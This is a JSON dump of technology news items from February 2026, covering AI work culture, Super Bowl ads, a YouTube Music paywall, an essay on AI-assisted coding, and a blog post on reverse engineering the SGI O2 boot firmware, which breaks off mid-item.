{
  "industry": "technology",
  "collected_at": "2026-02-09T02:31:28.404414+00:00",
  "hours": 24,
  "limit": 25,
  "count": 25,
  "items": [
    {
      "industry": "technology",
      "source": "Hacker News (Frontpage)",
      "title": "AI gold rush sees tech firms embracing 72-hour weeks",
      "url": "https://www.bbc.com/news/articles/cvgn2k285ypo",
      "published": "2026-02-09T01:28:16+00:00",
      "summary": "<p>Article URL: <a href=\"https://www.bbc.com/news/articles/cvgn2k285ypo\">https://www.bbc.com/news/articles/cvgn2k285ypo</a></p> <p>Comments URL: <a href=\"https://news.ycombinator.com/item?id=46940511\">https://news.ycombinator.com/item?id=46940511</a></p> <p>Points: 44</p> <p># Comments: 56</p>",
      "content_text": "In China, 996 has not disappeared, but its advocates have generally been a lot quieter. A notable exception was Baidu's one-time head of public relations, Qu Jing, who posted a series of videos on social media in 2024, aggressively defending a hard-working culture. Her brusque dismissal of employees' wellbeing, with the comment \"I'm not your mother, I only care about results\" provoked outrage. She later apologised , but it ultimately cost Qu her job.",
      "cover_image_url": "https://ichef.bbci.co.uk/news/1024/branded_news/dbd4/live/1b136220-02b4-11f1-b7e1-afb6d0884c18.jpg"
    },
    {
      "industry": "technology",
      "source": "The Verge",
      "title": "Super Bowl LX ads: all AI everything",
      "url": "https://www.theverge.com/entertainment/874504/super-bowl-lx-ads-big-game",
      "published": "2026-02-08T23:58:02+00:00",
      "summary": "Super Bowl LX is nearly here, with the Seattle Seahawks taking on the New England Patriots. While Bad Bunny will be the star of the halftime show, AI could be the star of the commercial breaks, much like crypto was a few years ago. Last year’s Super Bowl featured a Google Gemini ad that fumbled [&#8230;]",
      "content_text": "Super Bowl LX is nearly here, with the Seattle Seahawks taking on the New England Patriots. While Bad Bunny will be the star of the halftime show, AI could be the star of the commercial breaks, much like crypto was a few years ago . Last year‚Äôs Super Bowl featured a Google Gemini ad that fumbled a Gouda cheese stat , and this year‚Äôs game is already slated to include an ad for Anthropic‚Äôs AI platform that takes jabs at its competitors, namely OpenAI. AI-generated ads could make an appearance, too. Super Bowl LX is set to kick off at 6:30PM ET/3:30PM PT on Sunday, February 8th, and is being broadcast on NBC and Peacock.",
      "cover_image_url": "https://platform.theverge.com/wp-content/uploads/sites/2/chorus/uploads/chorus_asset/file/24008751/acastro_STK099_NFL_01.jpg?quality=90&strip=all&crop=0%2C10.732984293194%2C100%2C78.534031413613&w=1200"
    },
    {
      "industry": "technology",
      "source": "Hacker News (Frontpage)",
      "title": "Odd Lots Books",
      "url": "https://odd-lots-books.netlify.app/",
      "published": "2026-02-08T23:27:59+00:00",
      "summary": "<p>Article URL: <a href=\"https://odd-lots-books.netlify.app/\">https://odd-lots-books.netlify.app/</a></p> <p>Comments URL: <a href=\"https://news.ycombinator.com/item?id=46939685\">https://news.ycombinator.com/item?id=46939685</a></p> <p>Points: 18</p> <p># Comments: 2</p>",
      "content_text": "Timothy J. Kehoe , Juan Pablo Nicolini U of Minnesota Press , 2022 • 643 pages economics/latam politics/latam economics/macro economics/development A major, new, and comprehensive look at six decades of macroeconomic policies across the region What went wrong with the economic development of Latin America over the past half-century Along with periods of poor economic performance, the region’s countries have been plagued by a wide variety of economic crises This major new work brings together dozens of leading economists to explore the economic performance of the ten largest countries in South America and of Mexico Together they advance the fundamental hypothesis that, despite different manifestations, these crises all have been the result of poorly designed or poorly implemented fiscal and monetary policies Each country is treated in its own section of the book, with a lead chapter presenting a comprehensive database of the country’s fiscal, monetary, and economic data from 1960 to 2017 The chapters are drawn from one-day academic conferences—hosted in all but one case, in the focus country—with participants including noted economists and former leading policy makers Cowritten with Nobel Prize winner Thomas J Sargent, the editors’ introduction provides a conceptual framework for analyzing fiscal and monetary policy in countries around the world, particularly those less developed A final chapter draws conclusions and suggests directions for further research A vital resource for advanced undergraduate and graduate students of economics and for economic researchers and policy makers, A Monetary and Fiscal History of Latin America, 1960–2017 goes further than any book in stressing both the singularities and the similarities of the economic histories of Latin America’s largest countries Contributors: Mark Aguiar, Princeton U; Fernando Alvarez, U of Chicago; Manuel Amador, U of Minnesota; Joao Ayres, Inter-American Development Bank; Saki Bigio, UCLA; Luigi Bocola, Stanford U; Francisco J Buera, Washington U, St. Louis; Guillermo Calvo, Columbia U; Rodrigo Caputo, U of Santiago; Roberto Chang, Rutgers U; Carlos Javier Charotti, Central Bank of Paraguay; Simón Cueva, TNK Economics; Julián P Díaz, Loyola U Chicago; Sebastian Edwards, UCLA; Carlos Esquivel, Rutgers U; Eduardo Fernández Arias, Peking U; Carlos Fernández Valdovinos (former Central Bank of Paraguay); Arturo José Galindo, Banco de la República, Colombia; Márcio Garcia, PUC-Rio; Felipe González Soley, U of Southampton; Diogo Guillen, PUC-Rio; Lars Peter Hansen, U of Chicago; Patrick Kehoe, Stanford U; Carlos Gustavo Machicado Salas, Bolivian Catholic U; Joaquín Marandino, U Torcuato Di Tella; Alberto Martin, U Pompeu Fabra; Cesar Martinelli, George Mason U; Felipe Meza, Instituto Tecnológico Autónomo de México; Pablo Andrés Neumeyer, U Torcuato Di Tella; Gabriel Oddone, U de la República; Daniel Osorio, Banco de la República; José Peres Cajías, U of Barcelona; David Perez-Reyna, U de los Andes; Fabrizio Perri, Minneapolis Fed; Andrew Powell, Inter-American Development Bank; Diego Restuccia, U of Toronto; Diego Saravia, U de los Andes; Thomas J Sargent, New York U; José A Scheinkman, Columbia U; Teresa Ter-Minassian (formerly IMF); Marco Vega, Pontificia U Católica del Perú; Carlos Végh, Johns Hopkins U; François R Velde, Chicago Fed; Alejandro Werner, IMF.",
      "cover_image_url": null
    },
    {
      "industry": "technology",
      "source": "Ars Technica",
      "title": "A Project Hail Mary final trailer? Yes please",
      "url": "https://arstechnica.com/culture/2026/02/a-project-hail-mary-final-trailer-yes-please/",
      "published": "2026-02-08T23:26:37+00:00",
      "summary": "\"There are infinite possibilities for this to go wrong.\"",
      "content_text": "VIDEO Sure, most Americans are glued to their TVs for the today’s Super Bowl and/or the Winter Olympics. But for the non-sports minded, Amazon MGM Studios has released one last trailer for its forthcoming space odyssey Project Hail Mary , based on Andy Weir’s ( The Martian ) bestselling 2021 novel about an amnesiac biologist-turned-schoolteacher in space. As previously reported , Amazon MGM Studios acquired the rights for Weir’s novel before it was even published and brought on Drew Goddard to write the screenplay. (Goddard also wrote the adapted screenplay for The Martian , so he’s an excellent choice.) The studio tapped Phil Lord and Christopher Miller ( Cloudy with a Chance of Meatballs, The LEGO Movie ) to direct and signed on Ryan Gosling to star. Per the official premise: Science teacher Ryland Grace (Ryan Gosling) wakes up on a spaceship light years from home with no recollection of who he is or how he got there. As his memory returns, he begins to uncover his mission: solve the riddle of the mysterious substance causing the sun to die out. He must call on his scientific knowledge and unorthodox ideas to save everything on Earth from extinction… but an unexpected friendship means he may not have to do it alone. In addition to Gosling, the cast includes Sandra Huller as head of the Hail Mary project and Ryland’s superior; Milana Vayntrub as project astronaut Olesya Ilyukhina; Ken Leung as project astronaut Yao Li-Jie; Liz Kingsman as Shapiro; Orion Lee as Xi; and James Ortiz as a new life form Ryland names Rocky.",
      "cover_image_url": "https://cdn.arstechnica.net/wp-content/uploads/2026/02/hailmary1-1152x648-1770592195.jpg"
    },
    {
      "industry": "technology",
      "source": "Hacker News (Frontpage)",
      "title": "AI Makes the Easy Part Easier and the Hard Part Harder",
      "url": "https://www.blundergoat.com/articles/ai-makes-the-easy-part-easier-and-the-hard-part-harder",
      "published": "2026-02-08T23:13:34+00:00",
      "summary": "<p>Article URL: <a href=\"https://www.blundergoat.com/articles/ai-makes-the-easy-part-easier-and-the-hard-part-harder\">https://www.blundergoat.com/articles/ai-makes-the-easy-part-easier-and-the-hard-part-harder</a></p> <p>Comments URL: <a href=\"https://news.ycombinator.com/item?id=46939593\">https://news.ycombinator.com/item?id=46939593</a></p> <p>Points: 143</p> <p># Comments: 123</p>",
      "content_text": "A friend of mine recently attended an open forum panel about how engineering orgs can better support their engineers. The themes that came up were not surprising: Sacrificing quality makes it hard to feel proud of the work. No acknowledgement of current velocity. If we sprint to deliver, the expectation becomes to keep sprinting, forever. I've been hearing variations of this for a while now, but now I'm also hearing and agreeing with \"AI doesn't always speed us up\". \"AI did it for me\" Developers used to google things. You'd read a StackOverflow answer, or an article, or a GitHub issue. You did some research, verified it against your own context, and came to your own conclusion. Nobody said \"Google did it for me\" or \"it was the top result so it must be true.\" Now I'm starting to hear \"AI did it for me.\" That's either overhyping what happened, or it means the developer didn't come to their own conclusion. Both are bad. If someone on my team ever did say Google wrote their code because they copied a StackOverflow answer, I'd be worried about the same things I'm worried about now with AI: did you actually understand what you pasted? Vibe coding has a ceiling Vibe coding is fun. At first. For prototyping or low-stakes personal projects, it's useful. But when the stakes are real, every line of code has consequences. On a personal project, I asked an AI agent to add a test to a specific file. The file was 500 lines before the request and 100 lines after. I asked why it deleted all the other content. It said it didn't. Then it said the file didn't exist before. I showed it the git history and it apologised, said it should have checked whether the file existed first. (Thank you git). Now imagine that in a healthcare codebase instead of a side project. AI assistance can cost more time than it saves. That sounds backwards, but it's what happened here. I spent longer arguing with the agent and recovering the file than I would have spent writing the test myself. Using AI as an investigation tool, and not jumping straight to AI as solution provider, is a step that some people skip. AI-assisted investigation is an underrated skill that's not easy, and it takes practice to know when AI is wrong. Using AI-generated code can be effective, but if we give AI more of the easy code-writing tasks, we can fall into the trap where AI assistance costs more time than it saves. Hard part gets harder Most people miss this about AI-assisted development. Writing code is the easy part of the job. It always has been. The hard part is investigation, understanding context, validating assumptions, and knowing why a particular approach is the right one for this situation. When you hand the easy part to AI, you're not left with less work. You're left with only the hard work. And if you skipped the investigation because AI already gave you an answer, you don't have the context to evaluate what it gave you. Reading and understanding other people's code is much harder than writing code. AI-generated code is other people's code. So we've taken the part developers are good at (writing), offloaded it to a machine, and left ourselves with the part that's harder (reading and reviewing), but without the context we'd normally build up by doing the writing ourselves. Sprint expectations and burnout My friend's panel raised a point I keep coming back to: if we sprint to deliver something, the expectation becomes to keep sprinting. Always. Tired engineers miss edge cases, skip tests, ship bugs. More incidents, more pressure, more sprinting. It feeds itself. This is a management problem, not an engineering one. When leadership sees a team deliver fast once (maybe with AI help, maybe not), that becomes the new baseline. The conversation shifts from \"how did they do that?\" to \"why can't they do that every time?\" My friend was saying: When people claim AI makes them 10x more productive, maybe it's turning them from a 0.1x engineer to a 1x engineer. So technically yes, they've been 10x'd. The question is whether that's a productivity gain or an exposure of how little investigating they were doing before. Burnout and shipping slop will eat whatever productivity gains AI gives you. You can't optimise your way out of people being too tired to think clearly. Senior skill, junior trust I've used the phrase \"AI is senior skill, junior trust\" to explain how AI coding agents work in practice. They're highly skilled at writing code but we have to trust their output like we would a junior engineer. The code looks good and probably works, but we should check more carefully because they don't have the experience. Another way to look at it: an AI coding agent is like a brilliant person who reads really fast and just walked in off the street. They can help with investigations and could write some code, but they didn't go to that meeting last week to discuss important background and context. Ownership still matters Developers need to take responsible ownership of every line of code they ship. Not just the lines they wrote, the AI-generated ones too. If you're cutting and pasting AI output because someone set an unrealistic velocity target, you've got a problem 6 months from now when a new team member is trying to understand what that code does. Or at 2am when it breaks. \"AI wrote it\" isn't going to help you in either situation. How can AI make the hard part easier? The other day there was a production bug. A user sent an enquiry to the service team a couple of hours after a big release. There was an edge case timezone display bug. The developer who made the change had 30 minutes before they had to leave to teach a class, and it was late enough for me to already be at home. So I used AI to help investigate, letting it know the bug must be based on recent changes and explaining how we could reproduce. Turned out some deprecated methods were taking priority over the current timezone-aware ones, so the timezone was never converting correctly. Within 15 minutes I had the root cause, a solution idea, and investigation notes in the GitHub issue. The developer confirmed the fix, others tested and deployed, and I went downstairs to grab my DoorDash dinner. No fire drill. No staying late. AI did the investigation grunt work, I provided the context and verified, the developer confirmed the solution. That's AI helping with the hard part.",
      "cover_image_url": null
    },
    {
      "industry": "technology",
      "source": "The Verge",
      "title": "YouTube Music starts putting lyrics behind a paywall",
      "url": "https://www.theverge.com/streaming/875511/youtube-music-lyrics-paywall",
      "published": "2026-02-08T22:55:43+00:00",
      "summary": "Free YouTube Music accounts are now seeing their access to lyrics limited, according to multiple reports. Google started testing lyrics as an exclusive feature for Premium users in September, but it appears that it's now receiving a wider rollout. It seems that free users will be limited to viewing lyrics for five songs per month, [&#8230;]",
      "content_text": "Free YouTube Music accounts are now seeing their access to lyrics limited, according to multiple reports . Google started testing lyrics as an exclusive feature for Premium users in September, but it appears that it‚Äôs now receiving a wider rollout . It seems that free users will be limited to viewing lyrics for five songs per month, though we‚Äôve reached out to Google for confirmation. Once that limit is reached, users will only be able to see the first couple of lines. Everything beyond that will be blurred out, and they‚Äôll be prompted to ‚ÄúUnlock lyrics with Premium.‚Äù The banner warning users about their limited lyric views remaining appears prominently when you open the tab, complete with a countdown.",
      "cover_image_url": "https://platform.theverge.com/wp-content/uploads/sites/2/2026/02/hge7tghc13ig1.jpeg?quality=90&strip=all&crop=0,13.615620283241,100,23.583793217301"
    },
    {
      "industry": "technology",
      "source": "TechCrunch",
      "title": "Amazon’s ‘Melania’ documentary stumbles in second weekend",
      "url": "https://techcrunch.com/2026/02/08/amazons-melania-documentary-stumbles-in-second-weekend/",
      "published": "2026-02-08T22:41:31+00:00",
      "summary": "After a better-than-expected opening weekend in theaters, box office for Amazon’s “Melania”fell 67%.",
      "content_text": "After a better-than-expected opening weekend in theaters, box office for Amazon’s “Melania” fell 67% , to an estimated $2.37 million, in its second weekend. The documentary about First Melania Trump has grossed a total of $13.5 million so far (almost all of that in the United States), which means it’s extremely unlikely the film — which Amazon spent $40 million to acquire and $35 million to market — will break even in theaters. Before “Melania”’s release, a former Amazon film executive asked how the price tag could be motivated by anything other than “currying favor” with the Trump administration or “an outright bribe.” Moviegoing typically slows during Super Bowl weekend, but the weekend’s top film, “Send Help,” only declined 47%. And after placing third on the charts last weekend, “Melania” is ninth this time. Perhaps anticipating discussion about the film’s decline, Amazon released a statement from its head of domestic theatrical distribution Kevin Wilson, who said, “Together, theatrical and streaming represent two distinct value creating moments that amplify the film’s overall impact.” “Melania” received universally negative reviews from critics , but its 99% audience rating on Rotten Tomatoes was so good that the site put out a statement insisting that the score was real .",
      "cover_image_url": "https://techcrunch.com/wp-content/uploads/2025/05/GettyImages-2202598378.jpg?resize=1200,787"
    },
    {
      "industry": "technology",
      "source": "Hacker News (Frontpage)",
      "title": "Cistercian Numeral Font",
      "url": "https://bobbiec.github.io/cistercian-font.html",
      "published": "2026-02-08T22:39:46+00:00",
      "summary": "<p>Article URL: <a href=\"https://bobbiec.github.io/cistercian-font.html\">https://bobbiec.github.io/cistercian-font.html</a></p> <p>Comments URL: <a href=\"https://news.ycombinator.com/item?id=46939312\">https://news.ycombinator.com/item?id=46939312</a></p> <p>Points: 16</p> <p># Comments: 1</p>",
      "content_text": "On this page, numbers are automatically rendered as medieval Cistercian numerals using a custom font (learn more) . Try copy-pasting the symbols or Ctrl/Cmd-F the numbers below! Type or edit text here (normal font):",
      "cover_image_url": "https://bobbiec.github.io/cistercian-font-preview.png"
    },
    {
      "industry": "technology",
      "source": "Hacker News (Frontpage)",
      "title": "Founding Engineer (AI Products)",
      "url": "https://www.ycombinator.com/companies/toma/jobs/oONUnCf-founding-engineer-ai-products",
      "published": "2026-02-08T22:38:14+00:00",
      "summary": "<p>Article URL: <a href=\"https://www.ycombinator.com/companies/toma/jobs/oONUnCf-founding-engineer-ai-products\">https://www.ycombinator.com/companies/toma/jobs/oONUnCf-founding-engineer-ai-products</a></p> <p>Comments URL: <a href=\"https://news.ycombinator.com/item?id=46939298\">https://news.ycombinator.com/item?id=46939298</a></p> <p>Points: 0</p> <p># Comments: 0</p>",
      "content_text": "We're building the AI platform for underserved industries. LLM usage has seen a meteoric rise in the past year, but there is still a significant gap between agentic innovation and its use in the real world. This is especially true for underserved industries like automotive and healthcare, where outdated systems persist due to barriers to entry, legacy software, and high-stakes consequences of hallucinations and failure. Here at Toma (YC W24) , we are bridging this gap by providing a customer-centric platform to deploy and monitor AI agents, even for non-technical users. We recently raised a $17M Series A from a16z and are building the future of human-AI interactions, starting in the automotive industry. Our Team We’re assembling a team of Avengers: engineers, product managers, former founders, athletes, and leaders from Scale AI, Uber, Braze, Microsoft, Amazon, and more. We consider everyone regardless of their backgrounds or identities. Learn more about us here . About this Role We’re looking for a Founding Engineer hungry for ownership and eager to drive real impact. In this role, you’ll have the autonomy to build new AI-powered features, influence product direction, and help fuel our growth. You’ll partner closely with product and design to deliver fast, reliable, and magical user experiences, and your work will directly shape the future of our platform. This role is hands-on: you’ll build net-new products, write production code, and see your work go live with real customers quickly. What you will do Take ownership of net new AI features and products (dashboard, real-time voice AI, support tooling) Write production-grade TypeScript across the stack (Next.js, Bun) Help guide teammates through code reviews and technical discussions Collaborate with Product and Design to set priorities and ship quickly Integrate intelligent features into the product experience and drive growth Work closely with customers to translate their feedback into improvements Preferred Qualifications Experience in TypeScript, low-level Node.js ( Bun ), T3 Stack (Next.js, React, Prisma, PostgreSQL, NextAuth, tRPC) 1+ years of experience building and scaling full-stack web applications Desire to own projects end-to-end in a fast-paced environment Passion for learning, craft, and shipping high-quality features quickly Desire to continuously learn Don’t think you meet all the qualifications? Apply anyway. We’d love to hear what excites you about us, and we may have a role that's a good fit for you. Benefits MacBook Pro 16\" M4 Max (or newest high-end equivalent) Free daily in-office lunch and dinners Competitive salary with meaningful equity Free health, dental, and vision insurance Weekly team outings and customer visits Unlimited PTO",
      "cover_image_url": "https://bookface-images.s3.amazonaws.com/logos/7c044effc7e9547a3d575da12a37c2685395fac0.png?1765932365"
    },
    {
      "industry": "technology",
      "source": "Hacker News (Frontpage)",
      "title": "mattst88's blog - Reverse Engineering the PROM for the SGI O2",
      "url": "https://mattst88.com/blog/2026/02/08/Reverse_Engineering_the_PROM_for_the_SGI_O2/",
      "published": "2026-02-08T22:25:25+00:00",
      "summary": "<p>Article URL: <a href=\"https://mattst88.com/blog/2026/02/08/Reverse_Engineering_the_PROM_for_the_SGI_O2/\">https://mattst88.com/blog/2026/02/08/Reverse_Engineering_the_PROM_for_the_SGI_O2/</a></p> <p>Comments URL: <a href=\"https://news.ycombinator.com/item?id=46939187\">https://news.ycombinator.com/item?id=46939187</a></p> <p>Points: 47</p> <p># Comments: 10</p>",
      "content_text": "Reverse Engineering the PROM for the SGI O2 Since the early 2000s, the potential for upgrading the CPU in the Silicon Graphics O2 with a 900 MHz RM7900 has been blocked by the inability to modify the PROM firmware. To that end, I built ip32prom-decompiler , a program that decompiles the PROM into sources that can be reassembled into a bit-identical image. The decompiler goes to great lengths to produce assembly that is understandable and modifiable by replacing known constants, recognizing and replacing memory addresses with labels, inserting comments and function descriptions, marking function bounds, and many other niceties. In this article I'll describe the process of reverse engineering the structure and contents of the PROM so that I could build the decompiler. Background The Silicon Graphics O2 is a Unix workstation with a MIPS CPU. There are two families of CPUs available for the O2: in-order R5000 / RM7000 CPUs, from 180-350 MHz out-of-order R10000 / R12000 CPUs, from 150-400 MHz In the early 2000s, members of the Nekochan community replaced the 300 MHz RM5200 and 350 MHz RM7000A CPUs with a faster 600 MHz RM7000C model. The 600 MHz CPU, though in-order, is faster than the out-of-order 400 MHz R12000 CPU in most cases. This modification is documented by SGI Depot in the article Upgrading an O2 to 600MHz (and beyond!) . While replacing a BGA-mounted CPU takes significant tooling and expertise, the modification does not require any firmware or software changes. The Problem As the title (\"Upgrading an O2 to 600MHz (and beyond!)\") of the article might suggest, there were hopes of further upgrades. The article notes Meanwhile, Joe unfortunately did not have any success with the PMC 866Mhz CPU - apparently it is not quite as compatible with R5200 as PMC thought. Meanwhile, any ideas about a 900 are somewhat hampered by the need to have a distinctly modified IP32 PROM image, which would need some assistance from SGI. Who knows if they would be willing to help; one can but ask! Watch this space!! The 900 MHz CPU referred to is the RM7900 from PMC-Sierra. The RM7900 uses a newer E9000 CPU core but in a 304-pin BGA package compatible with earlier RM7000 CPUs. It is not clear to me what the 866 MHz CPU is — I can find no evidence of an 866 MHz MIPS CPU, RM7000 or otherwise. Presumably any attempts to use an RM7900 failed without support in the O2's PROM firmware. At the time, Silicon Graphics still existed and there remained some faint hope for access to the source code of the PROM — the boot firmware — but today Silicon Graphics is long gone and with it the source code for the PROM. (as well as any concerns about legal issues from reverse engineering!) The (partial) Solution I reverse engineered the PROM firmware and wrote a program to decompile it into modifiable assembly ( .S ) files. The assembly files can be reassembled into a bit-identical PROM image, thus verifying that the decompilation was accurate. With the PROM firmware now decompiled into modifiable assembly, the \"distinctly modified IP32 PROM image\" needed for RM7900 support is possible — no assistance from SGI required. External Annotations The assembly files are made more comprehensible with various annotations and other improvements to readability. The resulting assembly: Without improvements With improvements L_0xbfc019b0: lui $t1, 0xbfc0 lui $t0, 0xa000 addiu $t1, $t1, 0x19c8 or $t0, $t0, $t1 jr $t0 nop L_0xbfc019c8: mtc0 $zero, 5 mtc0 $zero, 29 addiu $t1, $zero, 0x23 nop mfc0 $t0, $t7 andi $t0, $t0, 0xff00 srl $t0, $t0, 8 beq $t0, $t1, 0xbfc01ae4 nop addiu $t1, $zero, 0x28 beq $t0, $t1, 0xbfc01ae4 nop addiu $t1, $zero, 0x27 bne $t0, $t1, 0xbfc01bbc nop addiu $t0, $zero, 0x2f lui $t1, 0x1000 L_0xbfc01a0c: addiu $at, $zero, 0x1fff not $t2, $at and $t2, $t2, $t1 lui $at, 0x8000 mtc0 $t0, 0 or $t2, $t2, $at mtc0 $t2, 10 srl $at, $t1, 0xc sll $at, $at, 6 ori $at, $at, 0x11 mtc0 $at, 2 addiu $t2, $at, 0x40 mtc0 $at, 3 addi $t0, $t0, -1 addiu $t1, $t1, -0x2000 bgtz $t0, 0xbfc01a0c tlbwi mfc0 $t0, $s0 addiu $at, $zero, -0x1001 and $t0, $t0, $at addiu $at, $zero, -9 and $t0, $t0, $at mtc0 $t0, 16 mfc0 $t0, $s0 srl $t0, $t0, 9 addiu $t1, $zero, 0x1000 andi $t0, $t0, 7 sllv $t0, $t1, $t0 addi $t0, $t0, -0x20 lui $t1, 0x8000 addu $t2, $t0, $t1 L_0xbfc01a88: cache 0, ($t2) addi $t0, $t0, -0x20 bgez $t0, 0xbfc01a88 addu $t2, $t0, $t1 mfc0 $t0, $s0 srl $t0, $t0, 6 addiu $t1, $zero, 0x1000 andi $t0, $t0, 7 sllv $t0, $t1, $t0 addi $t0, $t0, -0x20 lui $t1, 0x8000 lui $at, 0x1000 L_0xbfc01ab8: addu $at, $at, $t0 srl $at, $at, 0xc sll $at, $at, 8 mtc0 $at, 29 addu $t2, $t0, $t1 addi $t0, $t0, -0x20 cache 9, ($t2) bgez $t0, 0xbfc01ab8 lui $at, 0x1000 jr $ra nop [...] /* Function tlb_init_uncached_trampoline [0xbfc019b0 - 0xbfc019c8) * * Jump to tlb_init through uncached KSEG1 */ tlb_init_uncached_trampoline: /* 0xbfc019b0 */ lui $t1, %hi(tlb_init) lui $t0, HI(KSEG1) addiu $t1, $t1, %lo(tlb_init) or $t0, $t0, $t1 jr $t0 # Jump to (KSEG1 | tlb_init) nop /* Function tlb_init [0xbfc019c8 - 0xbfc01d98) */ tlb_init: /* 0xbfc019c8 */ mtc0 $zero, $CP0_PAGEMASK mtc0 $zero, $CP0_TAGHI li $t1, PRID_IMP_R5000 nop mfc0 $t0, $CP0_PRID andi $t0, $t0, PRID_IMP_MASK srl $t0, $t0, PRID_IMP_SHIFT beq $t0, $t1, tlb_r5k_init nop li $t1, PRID_IMP_NEVADA beq $t0, $t1, tlb_r5k_init nop li $t1, PRID_IMP_RM7000 bne $t0, $t1, tlb_r10k_init nop li $t0, RM7000_NUM_TLB_ENTRIES-1 lui $t1, HI(0x0fffe000) tlb_rm7k_write_tlb_loop: /* 0xbfc01a0c */ li $at, PAGE_OFFSET_MASK not $t2, $at and $t2, $t2, $t1 lui $at, HI(KSEG0) mtc0 $t0, $CP0_INDEX or $t2, $t2, $at mtc0 $t2, $CP0_ENTRYHI srl $at, $t1, PAGE_SHIFT sll $at, $at, ENTRYLO_PFN_SHIFT ori $at, $at, (ENTRYLO_G|ENTRYLO_C_UNCACHED) mtc0 $at, $CP0_ENTRYLO0 addiu $t2, $at, 1 << ENTRYLO_PFN_SHIFT mtc0 $at, $CP0_ENTRYLO1 addi $t0, $t0, -1 addiu $t1, $t1, LO(0x0fffe000) bgtz $t0, tlb_rm7k_write_tlb_loop tlbwi mfc0 $t0, $CP0_CONFIG li $at, ~RM7K_CONF_TE and $t0, $t0, $at li $at, ~CONF_CU and $t0, $t0, $at mtc0 $t0, $CP0_CONFIG mfc0 $t0, $CP0_CONFIG srl $t0, $t0, CONF_IC_SHIFT li $t1, 0x1000 andi $t0, $t0, CONF_CACHE_SIZE_MASK sllv $t0, $t1, $t0 addi $t0, $t0, -CACHE_LINE_SIZE lui $t1, HI(KSEG0) addu $t2, $t0, $t1 tlb_rm7k_inv_l1i_loop: /* 0xbfc01a88 */ cache (CACHE_TYPE_L1I|INDEX_WRITEBACK_INV), 0($t2) addi $t0, $t0, -CACHE_LINE_SIZE bgez $t0, tlb_rm7k_inv_l1i_loop addu $t2, $t0, $t1 mfc0 $t0, $CP0_CONFIG srl $t0, $t0, CONF_DC_SHIFT li $t1, 0x1000 andi $t0, $t0, CONF_CACHE_SIZE_MASK sllv $t0, $t1, $t0 addi $t0, $t0, -CACHE_LINE_SIZE lui $t1, HI(KSEG0) lui $at, 0x1000 tlb_rm7k_inv_l1d_loop: /* 0xbfc01ab8 */ addu $at, $at, $t0 srl $at, $at, PAGE_SHIFT sll $at, $at, RM7K_TAGHI_PTAG_SHIFT mtc0 $at, $CP0_TAGHI addu $t2, $t0, $t1 addi $t0, $t0, -CACHE_LINE_SIZE cache (CACHE_TYPE_L1D|INDEX_STORE_TAG), 0($t2) bgez $t0, tlb_rm7k_inv_l1d_loop lui $at, 0x1000 jr $ra nop [...] Reverse engineering the IP32 PROM When I began this process, I knew only a tiny bit about firmware or the MIPS instruction set. I knew even less about the initialization process for MIPS CPUs. First steps A mailing list post in 2004 about the topic dissuaded others from reverse engineering the IP32 PROM due to the difficulty. Modifying the binary is most assuredly way more difficult than gaining access to ip32PROM source and modifying it directly (and solving license issues). The level of change to the binary needed to make the ip32PROM detect a new CPU would require extremely detailed knowledge of the binary format the ip32PROM is in, SGI O2 systems, and how the PROM even functions. I'd wager a guess that a super-skilled SGI engineer might possibly pull this off, given enough caffeine. I read this and wondered, how difficult could it actually be? It didn't seem like firmware from 1996 would be terribly complex. I found a 512 KiB binary dump of the last version of the O2's PROM: $ md5sum ip32prom.rev4.18.bin c9725e036052cf1f3e6258eb9bc687fa ip32prom.rev4.18.bin And disassembled it: $ mips64-unknown-linux-gnu-objdump -D -b binary -m mips -EB ip32prom.rev4.18.bin | head ip32prom.rev4.18.bin: file format binary Disassembly of section .data: 00000000 <.data>: 0: 10000011 b 0x48 4: 00000000 nop 8: 53484452 beql k0,t0,0x11154 The first two instructions looked legitimate, but the third looked unlikely to be a real instruction. Further inspection of the disassembly indicated that there were real functions: [...] 152c: 03e00008 jr ra 1530: 00000000 nop 1534: 90820000 lbu v0,0(a0) 1538: 00001825 move v1,zero 153c: 24840001 addiu a0,a0,1 1540: 10400006 beqz v0,0x155c 1544: 00000000 nop 1548: 90820000 lbu v0,0(a0) 154c: 24840001 addiu a0,a0,1 1550: 24630001 addiu v1,v1,1 1554: 5440fffd bnezl v0,0x154c 1558: 90820000 lbu v0,0(a0) 155c: 03e00008 jr ra 1560: 00601025 move v0,v1 [...] The jr and nop at 152c and 1530 end a function, and the lbu at 1534 starts a new function by loading from the a0 (argument 0) register. The jr and move at 155c and 1560 return from the function and copy a value into v0 which holds the return value. (This function is strlen ). strings showed meaningful data as well: $ strings ip32prom.rev4.18.bin | head -n2 SHDR sloader I recognized that the first string (\"SHDR\") matched the odd looking instruction from the initial disassembly: 8: 53484452 beql k0,t0,0x11154 0x53484452 is \"SHDR\". SHDR Could this stand for section/segment header? What info was contained in the header? 0: 10000011 b 0x48 4: 00000000 nop 8: 53484452 # \"SHDR\" c: 00004000 # unknown data 10: 07030100 # unknown data 14: 736c6f61 # unknown data 18: 64657200 # unknown data 1c: 00000000 # unknown data 20: 00000000 # unknown data 24: 00000000 # unknown data 28: 00000000 # unknown data 2c: 00000000 # unknown data 30: 00000000 # unknown data 34: 312e3000 # unknown data 38: 00000000 # unknown data 3c: 8cb4693c # unknown data 40: 00000000 # unknown data 44: 00000000 # unknown data 48: 100000d7 b 0x3a8 4c: 00000000 nop [...] 3a8: 401a6000 mfc0 k0,$12 3ac: 001ad402 srl k0,k0,0x10 3b0: 335a0018 andi k0,k0,0x18 3b4: 235affe8 addi k0,k0,-24 [...] SHDR size The header appeared to be bounded by a branch+delay slot in [0x00, 0x08) and [0x48, 0x50). These two chained branches lead to valid-looking code at 0x3a8 . That meant that the SHDR size was 72 bytes (including 8 bytes for the branch and delay slot before the \"SHDR\" magic number ). Strings Interpreting the unknown data as ASCII found some additional strings: 736c6f61646572 is \"sloader\" . It's followed by 25 zero bytes (null terminator included), so this could be the name of the section in a 32-byte field. 312e30 is \"1.0\" . It's followed by 5 zero bytes (null terminator included), so this could be the version of the section in an 8-byte field. That left bytes [0x0c, 0x14), [0x3c, 0x48) unknown. The four bytes in [0x0c, 0x10) looked like they might be a single element, but I didn't know what 0x00004000 (16384) was. The four bytes in [0x10, 0x14) were 7310 . The length of the string \"sloader\" is 7 , and the length of the string \"1.0\" is 3 . These were probably the string lengths of the name and version fields. I didn't know what the 1 or 0 bytes meant. I had no idea what the data in [0x3c, 0x48) was. I found that there were 5 instances of \"SHDR\" in the binary dump. The table contains the name and version in each header and their lengths (which matched the actual strings!). Offset Name Name Len Version Version Len 0x00000000 sloader 7 1.0 3 0x00004000 env 3 1.0 3 0x00004400 post1 5 1.0 3 0x00009200 firmware 